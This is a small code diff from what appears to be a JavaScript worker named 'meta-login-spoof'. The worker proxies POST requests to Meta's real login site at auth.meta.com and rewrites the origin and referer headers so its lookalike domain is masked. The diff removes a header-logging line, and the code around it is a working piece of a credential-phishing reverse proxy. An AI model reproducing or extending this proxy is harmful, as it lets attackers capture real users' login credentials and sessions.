@@ -40,8 +40,6 @@ app.post("*", async ( req ) => {
 	proxyHeaders["origin"] = 'https://auth.meta.com';
 	proxyHeaders["referer"] = proxyHeaders["referer"].replace("https://meta-login-spoof.phaze.workers.dev", 'https://auth.meta.com');
 
-	console.log(proxyHeaders);
-
 	let proxy = await fetch('https://auth.meta.com' + url.pathname + url.search, { method: req.method, headers: proxyHeaders, body: await req.text() });
 
 	let body = await proxy.text();
